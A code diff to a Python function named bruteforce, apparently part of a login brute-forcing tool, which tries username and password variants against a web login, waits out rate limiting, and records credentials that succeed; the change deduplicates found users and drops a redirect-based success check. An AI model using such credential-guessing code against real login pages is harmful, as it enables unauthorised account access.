@@ -43,6 +43,7 @@ def bruteforce(request, url, host, port, agent,
     """
     # successful credentials
     success = []
+    success_users = set()
 
     # Add all transformations for each word
     all_words = set(words)
@@ -75,9 +76,11 @@ def bruteforce(request, url, host, port, agent,
                     #     print('Should be successful')
                     
                     # See if the response contained any words that indicate the login was successful.
-                    if verify_success_resp(tokenize_html(response)):
-                        print(f'User: {user}, Pass: {_pass} -- SUCCESS.')
-                        success.append(Credential(user,_pass))
+                    if verify_success_resp(tokenize_html(response, True)):
+                        print(f'    SUCCESS.')
+                        if user.lower() not in success_users:
+                            success.append(Credential(user.lower(),_pass))
+                            success_users.add(user.lower())
                         too_many_req = False
                         continue
 
@@ -90,12 +93,6 @@ def bruteforce(request, url, host, port, agent,
                             time.sleep(sleep_time)
                         else:
                             too_many_req = False
-                        # If we are redirected, assume login was successful.
-                        if status_code[:1] == "3":
-                            if verify_success_resp(tokenize_html(response, True)): # We want to analyze the redirection url
-                                success.append(Credential(user,_pass))
-                                print(f'User: {user}, Pass: {_pass} -- SUCCESS.')
-                                continue
                 else:
                     too_many_req = False
                 request.close()
